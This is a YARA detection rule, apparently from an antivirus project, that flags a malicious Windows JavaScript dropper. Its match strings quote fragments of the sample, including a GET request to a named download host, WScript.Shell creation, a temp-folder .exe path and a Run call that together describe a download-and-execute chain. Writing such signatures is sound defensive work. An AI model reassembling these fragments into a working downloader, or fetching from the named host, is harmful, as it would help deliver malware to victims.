rule sig_20160330_62e59747e7190e6988e348f359d10fd7 {
  meta:
    description = "datamaliciousorder - file 20160330_62e59747e7190e6988e348f359d10fd7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e959202d62f233839126bfa34e48cabf15fb21fccf9dad9a0e14b65ec5bcc28"

  strings:
    $s1  = "T1[A](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s2  = "function N(F0, W0){CJ = CJ * 1; return F0 - W0;};" fullword ascii
    $s3  = "var VQ = function F() {return WScript[QV](\"WScript\"+\".Shell\");}(), G = 11;" fullword ascii
    $s4  = "if (T1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function S() {return VQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"TiopJp2nk0fc7s.ex\" + \"e\";};" fullword ascii
    $s6  = "function D(){return RL + \"\";};" fullword ascii
    $s7  = "function RH(W){VQ[\"Run\"](W, CJ, CJ);};" fullword ascii
    $s8  = "function E() {return ((Z == true) && (Z == X)) ? 1 : CJ;};" fullword ascii
    $s9  = "function I(){return 22;};" fullword ascii
    $s10 = "function GJ(DR) {var T = (1, 2, 3, 4, 5, DR); return T;};" fullword ascii
    $s11 = "return N(U, TO);" fullword ascii
    $s12 = "function FO(){return QV;};" fullword ascii
    $s13 = "}while (VY);" fullword ascii
    $s14 = "var CE = new this[\"Date\"]();" fullword ascii
    $s15 = "function S0()" fullword ascii
    $s16 = "Z = true; " fullword ascii
    $s17 = "var Z = false;" fullword ascii
    $s18 = "var TC = false;" fullword ascii
    $s19 = "} catch(B){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}